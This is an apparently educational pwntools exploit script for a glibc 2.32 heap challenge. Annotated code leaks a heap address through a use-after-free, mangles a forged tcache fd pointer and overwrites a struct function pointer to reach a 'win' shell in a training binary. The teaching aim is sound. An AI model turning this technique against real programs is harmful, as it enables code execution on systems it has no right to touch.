#!/usr/bin/env python3
'''
Tcache Fake Fd Challenge with Pointer Mangling: 
- Run on GLibC version 2.32 
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.32/libc-2.32.so'
env = {}

# Binary setup
elf_name = '.happy-2.32'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = gdb.debug([elf.path], env = env, gdbscript='''
dir ../../../libc_versions/2.26/
''') 

else: 
	p = remote(domain, port) 

'''
Taken from https://github.com/mdulin2/mangle for the uses of mangling
heap pointers
'''
# Mangle the ptr
def encode_ptr(fd_ptr, storage_location, print_hex=False):
	if(print_hex):
		return hex((storage_location >> 12) ^ fd_ptr)	
	return (storage_location >> 12) ^ fd_ptr


# Demangle the ptr
def decode_ptr(mangled_ptr,storage_location, print_hex=False):
	if(print_hex):
		return hex((storage_location >> 12) ^ mangled_ptr)
	return (storage_location >> 12) ^ mangled_ptr

def create_kid(name, age):
	p.sendlineafter(">", "1") 

	# Send the name
	p.sendlineafter(":", name)

	# Send the age
	p.sendlineafter(":", str(age))
	return 

def edit_kid(index, name, age):
	p.sendlineafter(">", "4" )
	
	# Send the index 
	p.sendlineafter(":", str(index))
	# Send the name
	p.sendlineafter(":", name)
	# Send the age
	p.sendlineafter(":", str(age))
	return 

def free_kid(index):
	p.sendlineafter(">", "3") 

	# The index of the kid to free
	p.sendlineafter(":",str(index))

def view_kid(index): 
	p.sendlineafter(">", "2") 

	# Send the index to view
	p.sendlineafter(":", str(index))

	# Read the name
	p.recvuntil(":") 
	name = p.recvline()

	# Read the age
	p.recvuntil(":")  
	age = p.recvline() 
	return name, age 

def heap_leak():
	print("Step 1: heap leak")
	print("=================")
	'''
	The main vulnerability is a use-after-free for the kids in the array. 
	This same vulnerability can also be used for a double free scenario.

	With the use after free, we can do the following things: 
	- double free a kid (house of botcake technique) 
	- print the attributes of a kid 
	- edit the kid
	'''

	# Create three kids
	create_kid("Kid#1", 5) # Index 0: Use for UAF later
	create_kid("Kid#2", 6) 
	create_kid("Kid#3", 7) 

	free_kid(1)
	free_kid(0)
	'''
	Each struct looks like the following in memory: 
	8 bytes (age)  <-- fd
	20 bytes (name) <-- key
	8 bytes (print_info) 

	After freeing, the tcache bin looks like the following: 

	-----------------
	0x30: index0 -> index1
	-----------------

	Once this struct is freed this will go into the tcache bin
	(because of the small size, it goes into the 0x30 tcache).

	Recall that tcache has an fd ptr (in the first part of the 
	data of the chunk) that points to the next tcache chunk...

	Additionally, recall that the SECOND chunk has a 'key' for
	double free protection, which has a pointer to the tcache
	heap allocation.

	So, this means that the first entry of the struct will have a 
	tcache ptr to the next entry (if it's not the last item in the list).
	In 2.32+ though, THIS is pointer is mangled. Of course, this CAN 
	be figured out by demangling the pointer. However, the 'key'
	is a MUCH better target for a leak simply because it is not mangled.
	As a result, the 'key' is used for the leak in this version instead. 
	The second item has a pointer to the tcache iself. 
	By using this as a leak, we would only need ONE alloation and UAF. 

	The 'fd' pointer could also be used if setup properly. On the 2.23 
	and 2.26 versions of the exploit, we had to ensure that the chunk was
	not the only chunk in the bin and was at the front of the linked list. 
	This was because the leak would not work with the NULL pointer. However,
	pointer mangling mangles the pointer for a NULL pointer as well! As 
	a result, the 'fd' pointer is only shifted to the right twelve bits. 
	The XOR with NULL does nothing, making this leak sufficient for us 
	to use. 

	We use the UAF on the kid at index 0 in order to leak a heap address
	by using the key parameter.
	'''
	name, age = view_kid(0)
	name = name[1:-1].ljust(8, b"\x00")
	leak = u64(name)

	'''
	Subtract offset from heap to find beginning
	This will ALWAYS be the first heap allocation in a heap. 
	So, this means that we just subtract 0x10 to handle the 
	metadata.
	'''
	base = leak - 0x10
	print("Leaked heap address...", hex(leak))
	print("Heap base address...", hex(base))
	return base

def fake_chunk(leak):
	print("Step 2: Fake chunk Over Function Ptr")
	print("====================================") 

	'''
	We enter with a UAF on index 0 and index for Kids
	(from previous step). 

	The heap looks like the following: 
	
	--- Index 0 ----
	prev_size: 0x0 
	size: 0x31 (prev_inuse always set on first chunk) 
	--- Index 1 --- 
	pre_size: 0x0
	size: 0x31 
	---------------	

	Currently, the 'kid' at index 0 is freed (and writable). 
	The 'name' field (also the 'key' parameter of the tcache) 
	leaks this pointer (done in previous step).
	
	We can **overwrite** the fd pointer, we can 
	**create** a fake chunk at ANY location.

	Now, what is the best place to create a fake_chunk at? 
		- Function pointer on 'kid' struct
		- __malloc_hook 
		- GOT entries (if not Full RELRO) 

	Unlike fastbins, there is no need to have the SIZE 
	be a specific spot (making this easier to exploit). 
	However, with 2.32, there are a few things to worry about: 
		- Pointer mangling for the heap addresses on fd pointers
		- Must be aligned to 0x10 offset

	So, just put a chunk wherever you want! For this demo, 
	we will overwrite a function pointer within the 'kid' 
	struct but there are other options for this. 

	Once we have access to the fake chunk, write over the 
	function pointer to the 'win' function for code execution!
	How does this write actually look? Below: 

	---------------------
	0x0-0x7: prev_size
	0x8-0xf: size 
	0x10-0x17: age 
	0x18-0x37: name buffer <--------------
	0x38-0x3f: func_ptr                  |
	next chunk ...                       | Fake Chunk (at 0x30 offset)
	                                     |
	                       <--------------
	---------------------

	With this setup, the allocation will overlap with the function 
	pointer. By writing a name (second element of the struct) 
	we will have control of the function pointer.
	
	Steps: 
	- Overwrite kid 0's fd pointer to point to fake chunk 
	- Create a fake chunk within one of the kids, that is close 
	to the function pointer. 
	- Get the fake chunk 
	- Write over the function pointer to point to 'win'.
	- Profit :) 
	'''

	''' 
	Overwrite the fd pointer of the tcache chunk to point to 
	the fake_chunk (created in the previous line). 

	The offset is different than fastbins because the tcache bins 
	itself are inside of a 0x290) malloc allocation. 

	Now, we have the fake 'fd' to write. However, we need
	to mangle the pointer back first. 

	The tldr; is that the location pointer (storage) is shifted twelve
	bits (3 nibbles) then XORed with the pointer being stored. 
	Math - `New_Ptr = (L >> 12) XOR P`

	For more information on this process, look at the slides, 
	at https://maxwelldulin.com/BlogPost?post=5445977088 or 
	other resources. 

	The storage location is chunk 0 & the pointer will be the 
	location of our fake chunk.
		- mangling_ptr = (Chunk0_Loc >> 12) XOR Fake_Chunk

	With this in place, we ALLOCATE a chunk to have our FAKE CHUNK
	as the next item in the linked list. 

	NOTE: TCache has a COUNT. So, earliler on, we made two 
	allocations instead of ONE. This is necessary for the counts
	variable in a TCache bin.
	'''

	tcache_chunk_offset = 0x290 # Size of the tcache chunk
	chunk0_loc = tcache_chunk_offset + leak 
	fake_chunk = tcache_chunk_offset + 0x30 + leak # The fake chunk is at offset 0x30 to overwrite the function pointer in an easy way.

	# Call the pointer mangling function	
	mangled_fd = encode_ptr(fake_chunk, chunk0_loc) 

	print("Fd Pointer Fake Chunk Address: ", hex(fake_chunk))
	print("Storage location: ", hex(chunk0_loc))
	print("Mangled Fd Pointer: ", hex(mangled_fd))

	edit_kid(0, "?", mangled_fd) # Set the fake fd

# FOR THE WIN
def win():

	'''
	The next chunk that comes out of the 0x30 tcache bin 
	will be our fake chunk! 

	The call to 'create_kid' below triggers this! During this 
	step, we overwrite the 'func_ptr' at index 0 with the 
	'win' function to pop a shell. 
	'''
	
	'''
	The fake chunk is in the SECOND slot of the linked list. 
	So, in order to get chunk, we need to take an item out first. 
	'''
	print("Remove chunk at beginning of tcache linked list")
	create_kid("A" * 8, 1)
	# Get the fake_chunk (at the top of the tcache)
	print("Get the fake chunk") 
	print("Write over func_ptr with the 'win' function!") 
	create_kid("PWNED!", elf.symbols['win'])

	print("Pop shell!")
	# Print kid info option
	p.sendlineafter('>', '2') 

	# Index 1 has the overwritten function pointer. Pwned :)
	p.sendlineafter(':', '0') 


leak = heap_leak() 
fake_chunk(leak) 
win()
p.interactive()

